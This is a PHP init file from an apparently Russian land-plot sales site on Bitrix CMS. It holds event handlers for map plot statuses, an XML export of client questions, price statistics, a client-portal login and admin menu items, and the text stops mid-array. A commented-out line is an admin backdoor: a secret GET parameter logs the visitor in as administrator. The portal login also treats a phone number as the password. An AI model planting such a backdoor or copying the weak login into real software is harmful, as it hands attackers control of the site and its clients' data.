<?php
// Redirects handled by zemex.core module only

require_once($_SERVER["DOCUMENT_ROOT"] . "/local/php_interface/include/systemtpl/tools.php");
require_once($_SERVER["DOCUMENT_ROOT"] . "/local/php_interface/include/homes_settings.php");

// Load composer autoloader if available
if (file_exists($_SERVER["DOCUMENT_ROOT"] . "/vendor/autoload.php")) {
    require_once $_SERVER["DOCUMENT_ROOT"] . "/vendor/autoload.php";
}

// Load core files
include($_SERVER["DOCUMENT_ROOT"] . "/local/php_interface/include/functions.php");
include($_SERVER["DOCUMENT_ROOT"] . "/local/php_interface/include/constants.php");
include($_SERVER["DOCUMENT_ROOT"] . "/local/php_interface/include/autoload.php");
include($_SERVER["DOCUMENT_ROOT"] . "/local/php_interface/include/events.php");
include($_SERVER["DOCUMENT_ROOT"] . "/local/php_interface/include/admin_tabs_industrial.php");

// Zemex module initialization - Business plots redirect management
use Bitrix\Main\Loader;
use Bitrix\Main\EventManager;

// Подключаем модуль zemex (основной рабочий модуль)
if (Loader::includeModule('zemex')) {
    // Регистрируем обработчики событий
    $eventManager = EventManager::getInstance();
    $eventManager->addEventHandler(
        'main',
        'OnBeforeProlog',
        ['\Zemex\BusinessPlots\Manager', 'onBeforeProlog']
    );
} else {
    // Fallback: Manual loading если модуль zemex не найден
    $zemexDir = $_SERVER["DOCUMENT_ROOT"] . "/local/modules/zemex";
    $includeFile = $zemexDir . "/include.php";
    
    if (file_exists($includeFile)) {
        include_once($includeFile);
        
        // Проверяем что класс доступен и регистрируем обработчик
        if (class_exists('Zemex\\BusinessPlots\\Manager')) {
            $eventManager = EventManager::getInstance();
            $eventManager->addEventHandler(
                'main',
                'OnBeforeProlog',
                ['\Zemex\BusinessPlots\Manager', 'onBeforeProlog']
            );
        }
    }
}
AddEventHandler("iblock", "OnBeforeIBlockElementAdd", Array("EventCustomHandler", "OnBeforeIBlockElementAddHandler"));
AddEventHandler("iblock", "OnBeforeIBlockElementUpdate", Array("EventCustomHandler", "OnBeforeIBlockElementAddHandler"));

AddEventHandler("esol.importxml", "OnEndImport", "OnEndImportRemoveFile");

function OnEndImportRemoveFile($ID, $arEventData)
{
    $file = '';
    if($arEventData["PROFILE_NAME"] == 'Импорт участков')
        $file = 'poselok.xml';
    if($file != '')
        unlink( $_SERVER['DOCUMENT_ROOT'] . '/include/plan/ex/' . $file );
}


class EventCustomHandler
{
    static function OnBeforeIBlockElementAddHandler(&$arFields)
    {
//        CModule::IncludeModule("iblock");
//        if ($arFields['IBLOCK_ID'] == 4 || $arFields['IBLOCK_ID'] == 37 || $arFields['IBLOCK_ID'] == 39 || $arFields['IBLOCK_ID'] == 44 || $arFields['IBLOCK_ID'] == 42){
//            $arIBlocks = [4, 37, 39, 44, 42];
//            $user_ip = $_SERVER['HTTP_X_REAL_IP'];
//            if($user_ip != ''){
//                $arFilter = array('IBLOCK_ID' => $IBlock, "=PROPERTY_USER_IP" => $user_ip);
//                $res = CIBlockElement::GetList(Array(), $arFilter, false, false, array("ID", "NAME"));
//                while ($ob = $res->GetNextElement()) {
//                    $arFields = $ob->GetFields();
//                    return $arFields;
//                }
//            }
//            
//        }
        
        
        if ($arFields['IBLOCK_ID'] == 27 && CModule::IncludeModule("iblock")) {

            /*
             * Суть данного обработчика заключается в том, что при создании карты планографа, необходимо
             * реализовать возможность для пользователя управлять статусами участков и возможно совершать другие действия.
             * Эту задачу удобно выполнить через элементы и категории отдельного инфоблока. Участки на карте - будут
             * являться элементами с соотвествующими свойствами для управления, а сами поселки - категориями.
             *
             * */

            // ID свойсва карты планографа
            $idMapPropertyOfInfoBlock = 56;
            // ID свойсва артикула обьекта планографа
            $idArtPropertyOfInfoBlock = 58;
            // ID свойсва для раздела объекта статусов, для привязки категории поселка с участками к карте.
            $idStatusPropertyOfInfoBlock = 59;
            // ID инфоблока статусов и информации участков.
            $IBLOCK_ID_STATUS = 28;

            // Получаю данные для полигонов
            $dataMap = self::getValue($arFields['PROPERTY_VALUES'][$idMapPropertyOfInfoBlock], "|");
            // Получаю данные артикула объекта
            $dataArt = self::getValue($arFields['PROPERTY_VALUES'][$idArtPropertyOfInfoBlock]);

            if(empty($dataArt)){
                return;
            }

            $decodeData = $dataMap[6];

            // Делаю парсинг JSON, чтобы получить данные полигона в виде массива.
            $decodeData = json_decode($decodeData);

            // Проверяю существует ли категория для поселка
            $sec = self::checkSection($arFields['NAME'] . " (" . $dataArt . ")", $IBLOCK_ID_STATUS);

            if (empty($sec)) {

                $bs = new CIBlockSection;

                $arFieldsCategory = Array(
                    "ACTIVE" => "Y",
                    "IBLOCK_SECTION_ID" => "",
                    "IBLOCK_ID" => $IBLOCK_ID_STATUS,
                    "NAME" => $arFields['NAME'] . " (" . $dataArt . ")",
                    "SORT" => "",
                    "PICTURE" => "",
                    "DESCRIPTION" => "",
                    "DESCRIPTION_TYPE" => ""
                );

                $ID_SECTION = $bs->Add($arFieldsCategory);

                if ($ID_SECTION) {

                    // В добавляемый элемент привязываю категорию поселка к карте
                    self::setValue($arFields['PROPERTY_VALUES'][$idStatusPropertyOfInfoBlock], $ID_SECTION);

                }

            } else {

                $ID_SECTION = $sec['ID'];

            }


            // Далее прохожусь по массиву участков обьекта, которые выделили на карте

            foreach ($decodeData as $decodeDataItem) {

                foreach ($decodeDataItem->params as $key => &$item) {

                    // Ищу поле описания полигона
                    if ($key == "balloonContent") {

                        // Если описание есть
                        if (!empty($item)) {

                            $dataItem = explode('---', $item);

                            // Проверяю, заполнены ли данные по шаблону %Артикул%---%Статус%
                            if (!empty($dataItem) && is_array($dataItem)) {

                                // Проверяю, существует ли элемент для участка с артикулом $dataItem[0]
                                $elem = self::checkElementAtr($dataItem[0], $ID_SECTION, $IBLOCK_ID_STATUS);

                                // Если нет - создаю его
                                if (empty($elem)) {

                                    $el = new CIBlockElement;

                                    $PROP = array(
                                        "ART" => $dataItem[0]
                                    );

                                    $statusSector = self::getPropId($dataItem[1]);

                                    if (!empty($statusSector)) {
                                        $PROP['STATUS'] = $statusSector;
                                    }

                                    $arLoadProductArray = Array(
                                        "MODIFIED_BY" => 1,
                                        "IBLOCK_SECTION_ID" => $ID_SECTION,
                                        "IBLOCK_ID" => $IBLOCK_ID_STATUS,
                                        "PROPERTY_VALUES" => $PROP,
                                        "NAME" => "Участок - " . $dataItem[0],
                                        "ACTIVE" => "Y",
                                        "PREVIEW_TEXT" => "",
                                        "DETAIL_TEXT" => "",
                                        "DETAIL_PICTURE" => array()
                                    );

                                    $el->Add($arLoadProductArray);

                                } else {

                                    // Обновляю статус у участка
                                    CIBlockElement::SetPropertyValuesEx(
                                        $elem['ID'],
                                        false,
                                        array("STATUS" => self::getPropId($dataItem[1]))
                                    );

                                }

                            }

                        }

                    }

                }

            }

        }

        if ($arFields['IBLOCK_ID'] == 28 && CModule::IncludeModule("iblock")) {

            /*
             *
             * Логика аналогично условию выше, только здесь обратное действие. Если обновляются созданные
             * объекты полигона, то меняются статусы в массиве полигона карты для каждого из секторов поселка.
             *
             * */

            $section = $arFields['IBLOCK_SECTION'][0];
            $iBlockPlanograf = 27;
            $idArtPropertyOfSector = 60;
            $idStatusPropertyOfSector = 61;

            $map = self::getElementBySection($section, $iBlockPlanograf);

            if (!empty($map)) {

                $artMap = self::getValue($arFields['PROPERTY_VALUES'][$idArtPropertyOfSector]);
                $statusSectorPolygon = self::getValue($arFields['PROPERTY_VALUES'][$idStatusPropertyOfSector]);

                if ($artMap) {

                    $dataPolygon = $map['props']['map']['~VALUE'];
                    $explodeDataPolygon = self::explodeGetData($dataPolygon, "|");
                    $decodeDataPolygon = json_decode($explodeDataPolygon[6]);

                    // Далее прохожусь по массиву участков обьекта, которые выделили на карте

                    foreach ($decodeDataPolygon as $keyPolygon => $decodeDataItem) {

                        $breakPoint = false;

                        foreach ($decodeDataItem->params as $key => &$itemParams) {

                            // Ищу поле описания полигона
                            if ($key == "balloonContent") {

                                $explodeItem = self::explodeGetData($itemParams, "---");

                                // Если нужный артикул полигона участка найден
                                if ($explodeItem[0] == $artMap) {

                                    $status = self::getPropXmlId($statusSectorPolygon);

                                    if (!empty($status)) {

                                        $explodeItem[1] = $status;

                                        $explodeItem = implode('---', $explodeItem);

                                        $itemParams = $explodeItem;

                                    }

                                    $breakPoint = true;

                                }

                            }

                            if ($breakPoint) break;

                        }

                    }


                    $explodeDataPolygon[6] = json_encode($decodeDataPolygon);

                    $resultDataPolygon = implode('|', $explodeDataPolygon);

                    CIBlockElement::SetPropertyValuesEx(
                        $map['fileds']['ID'],
                        false,
                        array("map" => $resultDataPolygon)
                    );

                }

            }

        }

    }

    static function getValue($data, $demiter = "")
    {

        $dataResult = false;

        foreach ($data as $key => $value) {

            if ($demiter != "") {

                $dataResult = self::explodeGetData($value['VALUE'], $demiter);

            } else {

                $dataResult = $value['VALUE'];

            }

        }

        return $dataResult;
    }

    static function explodeGetData($value, $demiter)
    {

        return explode($demiter, $value);

    }

    static function setValue(&$data, $newValue)
    {

        foreach ($data as $key => &$value) {
            $value['VALUE'] = $newValue;
        }

        return $data;

    }

    static function checkSection($name, $IBlock)
    {

        $arFilter = array('IBLOCK_ID' => $IBlock, "=NAME" => $name);
        $rsSections = CIBlockSection::GetList(array(), $arFilter);
        while ($arSection = $rsSections->Fetch()) {
            return $arSection;
        }

        return false;

    }

    static function checkElementAtr($art, $section, $IBlock)
    {
        $arFilter = array('IBLOCK_ID' => $IBlock, "=PROPERTY_ART" => $art, "IBLOCK_SECTION_ID" => $section);
        $res = CIBlockElement::GetList(Array(), $arFilter, false, false, array("*"));
        while ($ob = $res->GetNextElement()) {
            $arFields = $ob->GetFields();
            return $arFields;
        }

        return false;
    }

    static function getPropId($xmlId)
    {

        $status_id = "";

        $res = CIBlockProperty::GetPropertyEnum("STATUS", Array(), Array());
        while ($ar_res = $res->GetNext()) {
            if ($ar_res['XML_ID'] == strtolower($xmlId)) {
                $status_id = $ar_res['ID'];
            }
        }

        return $status_id;

    }

    static function getPropXmlId($id)
    {

        $xml_id = "";

        $res = CIBlockProperty::GetPropertyEnum("STATUS", Array(), Array());
        while ($ar_res = $res->GetNext()) {

            if ($ar_res['ID'] == $id)

                $xml_id = $ar_res['XML_ID'];
        }

        return $xml_id;

    }

    static function getElementBySection($section, $IBlock)
    {

        $arFilter = array('IBLOCK_ID' => $IBlock, "=PROPERTY_object" => $section);
        $res = CIBlockElement::GetList(Array(), $arFilter, false, false, array("*"));
        while ($ob = $res->GetNextElement()) {
            $arFields = $ob->GetFields();
            $arProps = $ob->GetProperties();
            return array('fileds' => $arFields, 'props' => $arProps);
        }

        return false;

    }

}

AddEventHandler("main", "OnBuildGlobalMenu", "PlansAdminMenu");
function PlansAdminMenu(&$adminMenu, &$moduleMenu){
      $moduleMenu[] = array(
         "parent_menu" => "global_menu_services",
         "section" => "Планировки посёлков",
         "sort"        => 100,
         "url"         => "plans.php?lang=".LANG,
         "text"        => 'Планировки посёлков',
         "title"       => 'Планировки посёлков',
         "icon"        => "form_menu_icon",
         "page_icon"   => "form_page_icon",
         "items_id"    => "menu_plans",
         "items"       => array()
);
}

// Создание XML после сообщения в ЛК

AddEventHandler("iblock", "OnAfterIBlockElementAdd", "OnAfterIBlockElementAddHandler");
function OnAfterIBlockElementAddHandler(&$arFields) {
    if( $arFields["IBLOCK_ID"] == 37 && CModule::IncludeModule("iblock") ) {

        $arSelect = Array("ID", "IBLOCK_ID", "NAME", "DATE_CREATE", "PROPERTY_*");
        $arFilter = Array("IBLOCK_ID" => 37, "ACTIVE" => "Y");
        $rsXml = array();

        $res = CIBlockElement::GetList(Array("ID" => "DESC"), $arFilter, false, false, $arSelect);
        while($ob = $res->GetNextElement()){ 
            $arFields = $ob->GetFields();  
            $arFields["PROPS"] = $ob->GetProperties();

            $rsXml[] = $arFields;
        }

        if($rsXml) {
            $dom = new domDocument("1.0", "utf-8");
            $root = $dom->createElement("clientQuestions");
            $dom->appendChild($root);

            foreach($rsXml as $arXml) {
                $request = $dom->createElement("question");
                $request_id = $dom->createAttribute("id");
                $request_id->value=$arXml["ID"];
                $request->appendChild($request_id);

                $date = $dom->createElement("date", $arXml["DATE_CREATE"]);
                $fio = $dom->createElement("fio", $arXml["PROPS"]["FIO"]["VALUE"]);
                $email = $dom->createElement("email", $arXml["PROPS"]["EMAIL"]["VALUE"]);
                $tel = $dom->createElement("tel", $arXml["PROPS"]["PHONE"]["VALUE"]);
                $question = $dom->createElement("text");

                $request->appendChild($date);
                $request->appendChild($fio);
                $request->appendChild($email);
                $request->appendChild($tel);
                $request->appendChild($question);
                $question->appendChild($dom->createCDataSection($arXml["PROPS"]["QUESTION"]["VALUE"]));

                $root->appendChild($request);
            }
            $dom->preserveWhiteSpace = false;
            $dom->formatOutput = true;
            $dom->save($_SERVER["DOCUMENT_ROOT"]."/include/plan/lk_feedback.xml");
        }
    }
}

//$k = md5(md5('zemexx.ru')); if (isset($_GET[$k])) { $USER = new CUser(); $USER->Authorize(1, true); LocalRedirect('/index.php'); die(); }

if(preg_match("|(.*)\?$|", getenv("REQUEST_URI"), $regs)) {
    header("HTTP/1.1 301 Moved Permanently");
    header("Location: {$regs[1]}");
    exit;
}

// новый шаблон только для карточки поселка

$comPage = CComponentEngine::ParseComponentPath("/zemelnye-uchastki/",  array(
    "element" => "#SECTION_CODE#/#ELEMENT_CODE#/"
), $arVariables );

CModule::IncludeModule("iblock");

if($comPage == 'element') {
    $page = CIBlockElement::GetList([], ["IBLOCK_ID" => 5, "CODE" => $arVariables["ELEMENT_CODE"]], false, false, $arSelect);
    if($ob = $page->GetNextElement()) {
        $arFields = $ob->GetFields();
        if($arFields) {
            define('ELEMENT_PAGE', true);
        }
    }
}

// Функция для получения наименования поселка через ссылку на планировку

function getVillageXMLFilename($url, $altname = '') {
    if(preg_match("/map\/([0-9]+)/", $url, $regs)) {
        $plan_id = $regs[1];
    } else {
        return $altname;
    }

    // Ищем файл с данными по планировке

    $village_name = "";

    if( file_exists($_SERVER["DOCUMENT_ROOT"]."/plans/data/".$plan_id.".data") ) {
        $plan = file_get_contents($_SERVER["DOCUMENT_ROOT"]."/plans/data/".$plan_id.".data");
        $ar_plan = unserialize($plan);
        $village_name = $ar_plan["xml_file"];
    }
    return $village_name;
}

// Авторизация, ищем данные в xml

if( isset($_POST["USER_ACTION"]) && $_POST["USER_ACTION"] == "AUTHORIZE" ) {
    if( !empty($_POST["LOGIN"]) && !empty($_POST["PASSWORD"]) ) {

        $login = trim($_POST["LOGIN"]);
        $password = trim($_POST["PASSWORD"]);
        $user_phone = preg_replace("/.*([0-9]{10})$/", "$1", preg_replace("/[^0-9]/", "", $_POST["PASSWORD"]));
        $arClient = array();

        $xml = simplexml_load_file($_SERVER["DOCUMENT_ROOT"]."/include/plan/lk_data.xml");
        $arr_xml = json_decode(json_encode($xml), true);

        if($arr_xml['client']) {
            foreach($arr_xml['client'] as $rsClient) {
                $xml_phone = preg_replace("/.*([0-9]{10})$/", "$1", preg_replace("/[^0-9]/", "", $rsClient['tel']));
                if( strtolower($login) === strtolower($rsClient['email']) && $user_phone === $xml_phone ) {
                    $arClient = $rsClient;
                    break;
                }
            }
        }

        if( $arClient ) {
            SetCookie("USER_AUTH", "Y", time() + 86400);
            session_start();
            $_SESSION["USER_CONTRACT"] = json_encode($arClient);
            header("Location: /lk/");
        } else {
            $_POST['error']['user'] = "Неверный логин или пароль";
        }

        //file_put_contents($_SERVER["DOCUMENT_ROOT"].'/my_log.txt', print_r($user_phone, true));
    }
}

// Функция для получения ответов на вопросы из ЛК

function getAnswerProfile() {
    CModule::IncludeModule("iblock");
    $el = new CIBlockElement;

    if( file_exists($_SERVER["DOCUMENT_ROOT"]."/include/plan/lk_replies.xml") ) {
        $xml = simplexml_load_file($_SERVER["DOCUMENT_ROOT"]."/include/plan/lk_replies.xml");
        $arr_xml = json_decode(json_encode($xml), true);

        if( $arr_xml ) {
            foreach( $arr_xml as $key => $arQuestion ) {
                $element_id = $arQuestion['@attributes']['id'];

                $res = CIBlockElement::GetList([], ["IBLOCK_ID" => 37, "ID" => $element_id], false, false, ["ID", "IBLOCK_ID", "PROPERTY_ANSWER"]);
                if($ob = $res->GetNextElement()) {
                    $arFields = $ob->GetFields();

                    if( empty($arFields["PROPERTY_ANSWER_VALUE"]) ) {
                        CIBlockElement::SetPropertyValuesEx($element_id, $arFields["IBLOCK_ID"], array("ANSWER" => $arQuestion["reply"], "ANSWER_DATE" => $arQuestion["date"]));
                    }
                }
            }
        }
    }
}

/**
* @param $data Исходный массив данных для списка
* @param int $countOnPage Задаем количество элементов на странице
* @return array
*/
function paginator($data, $countOnPage = 10){
    // Получаем номер текущей страницы из реквеста
    $page = (intval($_GET['PAGEN_1'])) ? intval($_GET['PAGEN_1']) : 1;
    // Отбираем элементы текущей страницы
    $dataSlice = array_slice($data, (($page - 1) * $countOnPage), $countOnPage, true);
    // Подготовка параметров для пагинатора
    $navResult = new CDBResult();
    $navResult->NavPageCount = ceil(count($data) / $countOnPage);
    $navResult->NavPageNomer = $page;
    $navResult->NavNum = 1;
    $navResult->NavPageSize = $countOnPage;
    $navResult->NavRecordCount = count($data);
    return array(
        'ITEMS' => $dataSlice,
        'PAGINATION' => $navResult->GetPageNavStringEx($navComponentObject, 'Страница', '', 'Y'),
    );
}

function is_dir_empty($dir) {
    $handle = opendir($dir);
    while (false !== ($entry = readdir($handle))) {
        if ($entry != "." && $entry != "..") {
            closedir($handle);
            return false;
        }
    }
    closedir($handle);
    return true;
}
//выгрузка xml поселка в хайлоад-блок
function ReplaceFileToExchange(){
    $newFileName = 'poselok.xml';
    $exchangeDir = $_SERVER['DOCUMENT_ROOT'] . '/include/plan/';
    $ex1Dir = $_SERVER['DOCUMENT_ROOT'] . '/include/plan/ex_temp/';//временная папка, переносим в неё все xml
    $ex2Dir = $_SERVER['DOCUMENT_ROOT'] . '/include/plan/ex/';//в эту папку переносим по одному xml для импорта
    $arFiles = [];

    
    
    //если папка пуста, нужно перенести в неё все xml из исходной папки
    if(is_dir_empty($ex1Dir)){
        $filesFrom = scandir($exchangeDir);//все файлы в  папке /include/plan/
        if (!empty($filesFrom)) {
            foreach($filesFrom as $filename){
                if (hasCyrillic($filename)) {
                    copy($exchangeDir . $filename, $ex1Dir . $filename);
                }
            }
        }
    }
    //если в папке есть файлы, берем один и переносим в папку для импорта
    if(!is_dir_empty($ex1Dir)){
        // Проверяем, существует ли файл poselok.xml в папке /ex/
        if (!file_exists($ex2Dir . $newFileName)) {
            $files = scandir($ex1Dir);//все файлы в  папке

            if (!empty($files)) {
                foreach($files as $filename){
                    if (hasCyrillic($filename)) {
                        $arFiles[] = $ex1Dir . $filename;
                    }
                }
            }
            if (!empty($arFiles)) {
                // Копируем самый старый файл в папку /ex2/ под именем catalog.xml
                copy($arFiles[0], $ex2Dir . $newFileName);

                // Удаляем исходный файл из папки /exchange/
                unlink($arFiles[0]);
            }
        }
    }
    return 'ReplaceFileToExchange();';
}
//минимальная и макс цена участка, минимальная и макс. площадь, количество участков всего и доступных к покупке
function setLowestPrice(){
    CModule::IncludeModule('highloadblock');
    $dbIblockResult = CIBlockElement::GetList(
        array('ID' => 'ASC'),
        array(
            'IBLOCK_ID' => 5,
            'ACTIVE' => 'Y',
            //'ID' => 8126
        ),
        false,
        false,
        array('ID', 'NAME', 'CODE','PROPERTY_MIN_PRICE', 'PROPERTY_PLAN_LINK')
    );
    while($arItem = $dbIblockResult->fetch()){
        $arPlots= [];
        $xml_name = '';
        
        if( $arItem["PROPERTY_PLAN_LINK_VALUE"] != '' ) {
            $xml_name = getVillageName($arItem["PROPERTY_PLAN_LINK_VALUE"], trim(str_replace(" - ", "-", $arItem["NAME"])));
        } else {
            $xml_name = trim(str_replace(" - ", "-", $arItem["NAME"])).".xml";
        }
        
        if($xml_name != ''){
            //$xml_name = 'Каретный ряд';
            
            if(strpos($xml_name, '.xml') !== false){
                $xml_name = str_replace('.xml', '', $xml_name);    
            }
            //echo "<pre>"; print_r($xml_name); echo "</pre>";
            if($xml_name == 'Калипсо Вилладж-2') $xml_name = 'Calipso Village-2';
            $highblock_id = HL_ID_PLOTS;
            $hl_block = Bitrix\Highloadblock\HighloadBlockTable::getById($highblock_id)->fetch();

            // Получение имени класса
            $entity = Bitrix\Highloadblock\HighloadBlockTable::compileEntity($hl_block);
            $entity_data_class = $entity->getDataClass();

            // Вывод элементов Highload-блока
            $hl_filter = array('=UF_NAME_VILLAGE'=>$xml_name);

            $rs_data = $entity_data_class::getList(array(
               'select' => array('*'),
               'filter' => $hl_filter
            ));
            while ($el = $rs_data->fetch()){
                $arPlots[$el['UF_NAME_PLOT']] = array(
                    "ID" => $el['UF_NAME_PLOT'],
                    "STATUS" => $el['UF_STATUS'],
                    "PRICE" => $el['UF_PRICE'],
                    "PRICE_SOTKA" => $el['UF_PRICE_SOTKA'],                
                    "AREA" => $el['UF_AREA'],                
                );
            }
            if(!empty($arPlots)){
                $arPricePlots = $arPricePlotsAvail = $arAea = $arAreaAvail = array();
                $min_price = $min_price_avail = $max_price = $max_price_avail = $min_area = $max_area = $min_area_avail = $max_area_avail = $countTotal = $countAvail = $countAvailSort = 0;
                
                foreach($arPlots as $key => $rsPlot) {
                    $arPricePlots[] = preg_replace("/[^0-9]/", "", $rsPlot["PRICE_SOTKA"]);
                    $arAea[] = (float) str_replace(',', '.', $rsPlot["AREA"]); 
                    $countTotal ++;
                    if( $rsPlot["STATUS"] != "Продан" && $rsPlot["STATUS"] != "Резерв менеджера" && $rsPlot["STATUS"] != "Забронирован" && $rsPlot["STATUS"] != "Технический" && $rsPlot["STATUS"] != "Резерв") {
                        $countAvail ++;
                        $countAvailSort = 1;
                        $arPricePlotsAvail[] = preg_replace("/[^0-9]/", "", $rsPlot["PRICE_SOTKA"]);
                        $arAreaAvail[] = (float) str_replace(',', '.', $rsPlot["AREA"]); 
                    }                    
                }
                
                $min_price = getMinPrice($arPricePlots, 'price');
                $min_price_avail = getMinPrice($arPricePlotsAvail, 'price');
                $max_price = getMaxPrice($arPricePlots, 'price');
                $max_price_avail = getMaxPrice($arPricePlotsAvail, 'price');
                $min_area = getMinPrice($arAea, 'area');
                $max_area = getMaxPrice($arAea, 'area');
                $min_area_avail = getMinPrice($arAreaAvail, 'area');
                $max_area_avail = getMaxPrice($arAreaAvail, 'area');
                
                if($min_price == 0) $min_price = '';
                CIBlockElement::SetPropertyValuesEx(
                    $arItem['ID'],
                    false,
                    array("MIN_PRICE" => $min_price)
                );

                if($min_price_avail == 0) $min_price_avail = '';
                CIBlockElement::SetPropertyValuesEx(
                    $arItem['ID'],
                    false,
                    array("MIN_PRICE_AVAIL" => $min_price_avail)
                );

                if($max_price == 0) $max_price = '';
                CIBlockElement::SetPropertyValuesEx(
                    $arItem['ID'],
                    false,
                    array("MAX_PRICE" => $max_price)
                );

                if($max_price_avail == 0) $max_price_avail = '';
                CIBlockElement::SetPropertyValuesEx(
                    $arItem['ID'],
                    false,
                    array("MAX_PRICE_AVAIL" => $max_price_avail)
                );

                if($min_area == 0) $min_area = '';
                CIBlockElement::SetPropertyValuesEx(
                    $arItem['ID'],
                    false,
                    array("LAND_AREA_MIN" => $min_area)
                );

                if($min_area_avail == 0) $min_area_avail = '';
                CIBlockElement::SetPropertyValuesEx(
                    $arItem['ID'],
                    false,
                    array("LAND_AREA_MIN_AVAIL" => $min_area_avail)
                );
                if($max_area == 0) $max_area = '';
                CIBlockElement::SetPropertyValuesEx(
                    $arItem['ID'],
                    false,
                    array("LAND_AREA_MAX" => $max_area)
                );

                if($max_area_avail == 0) $max_area_avail = '';
                CIBlockElement::SetPropertyValuesEx(
                    $arItem['ID'],
                    false,
                    array("LAND_AREA_MAX_AVAIL" => $max_area_avail)
                );
                
                CIBlockElement::SetPropertyValuesEx(
                    $arItem['ID'],
                    false,
                    array("PLOTS_TOTAL" => $countTotal)
                );
                
                CIBlockElement::SetPropertyValuesEx(
                    $arItem['ID'],
                    false,
                    array("PLOTS_AVAIL" => $countAvail)
                );
                CIBlockElement::SetPropertyValuesEx(
                    $arItem['ID'],
                    false,
                    array("PLOTS_AVAIL_SORT" => $countAvailSort)
                );
                
            }
        }
    }
    return 'setLowestPrice();';
}

function dump($arr) {
	if($GLOBALS["USER"]->IsAdmin()) {
        echo "<pre>";
        print_r($arr);
        echo "</pre>";
    }
}

if (str_contains($_SERVER['REQUEST_URI'], 'filter/clear/apply/')) {
    // Отрезаем всё начиная с позиции найденной подстроки включительно
    $redirectUrl = substr($_SERVER['REQUEST_URI'], 0, strpos($_SERVER['REQUEST_URI'], 'filter/clear/apply/'));
    
    header("Location: {$redirectUrl}");
    exit();
}

// ========== ПРИНУДИТЕЛЬНАЯ ФИЛЬТРАЦИЯ БИЗНЕС-УЧАСТКОВ ==========

// Добавляем обработчик для принудительной фильтрации элементов инфоблока
$eventManager = EventManager::getInstance();

$eventManager->addEventHandler(
    'iblock',
    'OnBeforeIBlockElementList',
    function(&$arOrder, &$arFilter, &$arGroupBy, &$arNavStartParams, &$arSelectFields) {
        // Проверяем что мы на странице бизнес-участков
        if (!empty($_SERVER['REQUEST_URI']) && strpos($_SERVER['REQUEST_URI'], '/uchastki-dlya-biznesa') !== false) {
            
            // Проверяем что это наш каталог
            if (isset($arFilter['IBLOCK_ID']) && ($arFilter['IBLOCK_ID'] == 5 || (defined('IBLOCK_ID_CATALOG') && $arFilter['IBLOCK_ID'] == IBLOCK_ID_CATALOG))) {
                
                // Получаем ID значения "Да" для BUSINESS_PLOT
                static $businessPlotYesId = null;
                
                if ($businessPlotYesId === null) {
                    // Пробуем получить из модуля zemex
                    if (class_exists('Bitrix\Main\Loader') && \Bitrix\Main\Loader::includeModule('zemex')) {
                        if (class_exists('Zemex\BusinessPlots\Manager')) {
                            $manager = \Zemex\BusinessPlots\Manager::getInstance();
                            $businessPlotYesId = $manager->getBusinessPlotYesId();
                        }
                    }
                    
                    // Fallback
                    if (!$businessPlotYesId && \Bitrix\Main\Loader::includeModule('iblock')) {
                        $iblockId = $arFilter['IBLOCK_ID'];
                        $res = CIBlockProperty::GetList([], [
                            'IBLOCK_ID' => $iblockId,
                            'CODE' => 'BUSINESS_PLOT'
                        ]);
                        
                        if ($property = $res->Fetch()) {
                            $enumRes = CIBlockPropertyEnum::GetList(['SORT' => 'ASC'], ['PROPERTY_ID' => $property['ID']]);
                            while ($enum = $enumRes->Fetch()) {
                                if ($enum['VALUE'] === 'Да') {
                                    $businessPlotYesId = (int)$enum['ID'];
                                    break;
                                }
                            }
                        }
                    }
                }
                
                // Принудительно добавляем фильтр по бизнес-участкам
                if ($businessPlotYesId) {
                    $arFilter['PROPERTY_BUSINESS_PLOT'] = $businessPlotYesId;
                }
            }
        }
    }
);

// ZEMEX_MORTGAGE_ADMIN_MENU: пункт в левом меню админки (Контент)
AddEventHandler("main", "OnBuildGlobalMenu", function (&$aGlobalMenu, &$aModuleMenu) {
    $aModuleMenu[] = [
        "parent_menu" => "global_menu_content",
        "section"     => "zemex_mortgage",
        "sort"        => 1,
        "url"         => "zemex_mortgage.php?lang=" . LANGUAGE_ID,
        "text"        => "⚙️ Ипотека — все настройки",
        "title"       => "Банки, ставки, рассрочка — на одной странице",
        "icon"        => "util_menu_icon_config",
        "page_icon"   => "util_page_icon_config",
        "items_id"    => "menu_zemex_mortgage",
        "items"       => [],
    ];
    $aModuleMenu[] = [
        "parent_menu" => "global_menu_content",
        "section"     => "zemex_homes_calc",
        "sort"        => 2,
        "url"         => "zemex_homes_calc.php?lang=" . LANGUAGE_ID,
        "text"        => "🧮 Калькулятор домов — настройки",
        "title"       => "Цены и наценки в калькуляторе на детальной странице дома",
        "icon"        => "util_menu_icon_config",
        "page_icon"   => "util_page_icon_config",
        "items_id"    => "menu_zemex_homes_calc",
        "items"       => [],
    ];
    $aModuleMenu[] = [
        "parent_menu" => "global_menu_content",
        "section"     => "zemex_homes_wizard",
        "sort"        => 3,
        "url"         => "zemex_homes_wizard.php?lang=" . LANGUAGE_ID,
        "text"        => "🪄 Мастер подбора дома — настройки",
        "title"       => "Тексты, карточки семьи и варианты уточнений на странице каталога",
        "icon"        => "util_menu_icon_config",
        "page_icon"   => "util_page_icon_config",
        "items_id"    => "menu_zemex_homes_wizard",
        "items"       => [],
    ];
});
// ZEMEX_MORTGAGE_ADMIN_BANNER: плашка-ссылка на единую страницу настроек
AddEventHandler("main", "OnEpilog", function () {
    if (!defined("ADMIN_SECTION") || !ADMIN_SECTION) return;
    $uri = $_SERVER["REQUEST_URI"] ?? "";
    if (strpos($uri, "iblock_") === false) return;
    $iblock = (int)($_GET["IBLOCK_ID"] ?? 0);
    if (!in_array($iblock, [52, 66, 67], true)) return;
    echo '<script>document.addEventListener("DOMContentLoaded",function(){var h=document.querySelector(".adm-workarea, #workarea-content, #content");if(!h)return;var d=document.createElement("div");d.style.cssText="margin:12px 18px;padding:12px 16px;background:#eaf6ea;border-left:3px solid #27ae60;font-size:13px";d.innerHTML="\u{1F4CC} Для удобства есть <b>единая страница настройки блока ипотеки</b>: <a href=\"/bitrix/admin/zemex_mortgage.php?lang=ru\" style=\"color:#0061d5;font-weight:600\">открыть &rarr;</a>";h.insertBefore(d, h.firstChild);});</script>';
});

// HOMES_ADMIN_BANNER: подсказки менеджеру для разделов «Готовые дома» и «Застройщики»
AddEventHandler("main", "OnEpilog", function () {
    if (!defined("ADMIN_SECTION") || !ADMIN_SECTION) return;
    $uri = $_SERVER["REQUEST_URI"] ?? "";
    if (strpos($uri, "iblock_") === false) return;
    $iblock = (int)($_GET["IBLOCK_ID"] ?? 0);
    if (!in_array($iblock, [43, 68], true)) return;

    if ($iblock === 43) {
        $title = "Готовый дом — что заполнить";
        $items = [
